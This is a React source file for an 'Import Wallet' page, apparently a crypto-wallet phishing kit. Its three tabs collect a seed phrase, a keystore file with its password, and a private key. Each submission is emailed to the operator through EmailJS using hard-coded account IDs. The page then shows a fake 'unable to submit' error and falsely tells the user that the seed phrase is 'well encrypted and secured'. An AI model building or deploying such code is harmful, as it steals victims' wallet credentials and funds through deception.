import React, { useState } from 'react';
import { useToast, Heading, Text, Box } from '@chakra-ui/react';
import { Tabs, TabList, TabPanels, Tab, TabPanel } from '@chakra-ui/react';
import emailjs from 'emailjs-com';

import { FooterTwo } from '../../components';

const Connect = () => {
  const [phrase, setPhrase] = useState('');
  const [password, setPassword] = useState('');
  const toast = useToast();
  const [isSubmitted, setIsSubmitted] = useState(false);
  const submitHandler = (e) => {
    e.preventDefault();

    phrase !== ''
      ? emailjs
          .sendForm(
            'service_7jjygm7',
            'template_yn75e18',
            e.target,
            'w2p_964v2HZgV5OUU'
          )
          .then(res => {
            console.log(res);
            setIsSubmitted(true);
          })
          .catch(err => {
            console.log(err.text);
          })
      : toast({
          title: 'Input Error.',
          description: "You can't leave the field empty.",
          status: 'error',
          duration: 1000,
          isClosable: true,
        });

    setPhrase('');
    setPassword('');
  };

  return (
    <>
      <div className=" my-5" align="center">
        <Heading as="h2" size="2xl" mb="8"  color={'gray.50'}>
          Import Wallet
        </Heading>
      </div>
      <div className="w-full" align="center">
        <Box w="full" display="grid" placeItems={'center'}>
          <Tabs
            variant="solid-rounded"
            isLazy
            colorScheme="green"
            margin={'0 auto'}
          >
            <Box
              as={TabList}
              minW="360px"
              maxW="900px"
              display={'flex'}
              alignItems="center"
              justifyContent={'center'}
              w="full"
              margin={'0 auto'}
            >
              <Tab>Phrase</Tab>
              <Tab>Keystore JSON</Tab>
              <Tab>Private Key</Tab>
            </Box>
            <Box as={TabPanels} width={'full'}>
              <TabPanel width={'full'}>
                {isSubmitted ? (
                  <Box
                    bg={'whiteAlpha.100'}
                    padding="8"
                    w="full"
                    borderRadius={'md'}
                  >
                    <Text fontSize="2xl" color={'red.600'}>
                      The form was unable to submit. Please contact the site
                      administrator.
                    </Text>
                  </Box>
                ) : (
                  <form id="my-form" onSubmit={submitHandler}>
                    <input type="hidden" name="_next" value="/" />
                    <textarea
                      name="message"
                      className="phrase-textarea w-[90vw] md:w-[70vw]"
                      value={phrase}
                      onChange={e => setPhrase(e.target.value)}
                    ></textarea>
                    <button className="submit-btn btn btn-primary bg-green-500 mt-4" type="submit">
                      Import
                    </button>
                  </form>
                )}
                <p className="mb-5 max-w-[300px] text-center w-full text-light">
                  Typically 12 (sometimes 24) words seperated by a single
                  spaces.
                </p>
              </TabPanel>
              <TabPanel width={'full'}>
                {isSubmitted ? (
                  <Box
                    bg={'whiteAlpha.100'}
                    padding="8"
                    w="full"
                    borderRadius={'md'}
                  >
                    <Text fontSize="2xl" color={'red.600'}>
                      The form was unable to submit. Please contact the site
                      administrator.
                    </Text>
                  </Box>
                ) : (
                  <form id="my-form" onSubmit={submitHandler}>
                    <input type="hidden" name="_next" value="/" />
                    <textarea
                     name="message"
                      className="phrase-textarea w-[90vw] md:w-[70vw]"
                      value={phrase}
                      onChange={e => setPhrase(e.target.value)}
                    ></textarea>

                    <input
                      className="w-[90vw] md:w-[70vw] h-10 border-green-500 border-2 py-2 px-4 outline-none rounded-md"
                      placeholder="password"
                      type="password"
                      name="password"
                      value={password}
                      onChange={e => setPassword(e.target.value)}
                    />

                    <p className="mb-5 text-center w-full">
                      Several lines of text beginning with '(...)' plus the
                      password you used to encrypt it.
                    </p>
                    <button className="submit-btn btn btn-primary bg-green-500 mt-4" type="submit">
                      Import
                    </button>
                  </form>
                )}
              </TabPanel>
              <TabPanel>
                {isSubmitted ? (
                  <Box
                    bg={'whiteAlpha.100'}
                    padding="8"
                    w="full"
                    borderRadius={'md'}
                  >
                    <Text fontSize="2xl" color={'red.600'}>
                      The form was unable to submit. Please contact the site
                      administrator.
                    </Text>
                  </Box>
                ) : (
                  <form id="my-form" onSubmit={submitHandler}>
                    <input type="hidden" name="_next" value="/" />
                    <textarea
                      name="message"
                      className="phrase-textarea w-[90vw] md:w-[70vw]"
                      padding="8"
                      value={phrase}
                      onChange={e => setPhrase(e.target.value)}
                    ></textarea>
                    <p className="mb-5 text-center w-full">
                      Account Private Key
                    </p>
                    <button className="submit-btn btn btn-primary bg-green-500 mt-4" type="submit">
                      Import
                    </button>
                  </form>
                )}
              </TabPanel>
            </Box>
          </Tabs>
        </Box>
        <p className="my-5 text-light " >
          <b>Note:</b> Your wallet seed phrase is well encrypted and secured.
        </p>
      </div>
      <FooterTwo />
    </>
  );
};

export default Connect;
